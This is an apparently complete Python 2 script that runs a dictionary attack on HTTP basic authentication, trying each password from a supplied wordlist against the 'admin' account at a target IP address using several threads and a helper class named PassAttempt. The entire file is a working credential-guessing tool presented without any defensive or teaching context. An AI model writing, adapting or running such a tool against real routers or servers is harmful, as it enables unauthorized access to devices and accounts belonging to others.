from PassAttempt import PassAttempt
import urllib2
import sys
import threading
import Queue
import optparse


class myThread(threading.Thread):
    def __init__(self,password):
        threading.Thread.__init__(self)
        self.password = password

    def run(self):
        global found
        global sema
        if(found):
           pass
        else:
            pa = PassAttempt("admin", self.password)
            pmanage = urllib2.HTTPPasswordMgrWithDefaultRealm()
            threadLock.acquire()
            if(pa.tryPass(targetIP, pmanage)):
                print pa.password
                found = True
            sema.release()
            threadLock.release()
parser = optparse.OptionParser('usage:% prog -f passFile -t target')
parser.add_option('-f', dest = 'fileName', type='string', \
        help = 'Specify a file name')
parser.add_option('-t', dest = 'target', type='string', \
        help = 'Specify a target ip address')
(options, args) = parser.parse_args()
if(options.fileName == None or options.target == None):
    print(parser.usage)
    exit(0)
found = False
fileName = options.fileName
targetIP = "http://"
targetIP = targetIP + options.target
passlist = []
sema = threading.BoundedSemaphore(value=4)
threadLock = threading.Lock()
with open(fileName) as f:
    content = f.readlines()
    passlist = [x.strip() for x in content]
for password in passlist:
    if(found):
        break
    sema.acquire()
    thread = myThread(password)
    thread.start()
